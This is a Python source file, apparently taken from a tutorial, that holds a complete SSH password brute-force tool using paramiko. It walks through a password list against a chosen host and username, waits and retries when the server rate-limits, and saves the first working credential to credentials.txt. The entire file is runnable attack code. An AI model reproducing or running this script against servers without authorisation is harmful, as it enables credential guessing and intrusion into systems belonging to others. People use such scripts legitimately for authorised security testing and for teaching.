#!/usr/bin/env python3

# source: https://www.thepythoncode.com/article/brute-force-ssh-servers-using-paramiko-in-python

import paramiko
import socket
import time
from colorama import init, Fore

# initialize colorama
init()

GREEN = Fore.GREEN
RED = Fore.RED
RESET = Fore.RESET
BLUE = Fore.BLUE

def is_ssh_open(hostname, username, password):
    # initialize SSH client
    client = paramiko.SSHClient()
    # add to know hosts
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(hostname=hostname, username=username, password=password, timeout=3)
    except socket.timeout:
        print("{}[!] Host: {} is unreachable, timed out.{}".format(RED, hostname, RESET))
        return False
    except paramiko.AuthenticationException:
        print("[!] Invalid credentials for {}:{}".format(username, password))
        return False
    except paramiko.SSHException:
        print("{}[*] Quota exceeded, retrying with delay...{}".format(BLUE, RESET))
        time.sleep(60)
        return is_ssh_open(hostname, username, password)
    else:
        print("{}[+] Found combo:\n\tHOSTNAME: {}\n\tUSERNAME: {}\n\tPASSWORD: {}{}".format(GREEN, hostname, username, password, RESET))
        return True

if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="SSH Bruteforce Python script")
    parser.add_argument("host", help="Hostname or IP Address of SSH Server to bruteforce")
    parser.add_argument("-P", "--passlist", help="File that contain password list in each line")
    parser.add_argument("-u", "--user", help="Host username")

    args = parser.parse_args()
    host = args.host
    passlist = args.passlist
    user = args.user

    passlist = open(passlist).read().splitlines()

    for password in passlist:
        if is_ssh_open(host, user, password):
            open("credentials.txt", "w").write("{}@{}:{}".format(user, host, password))
            break
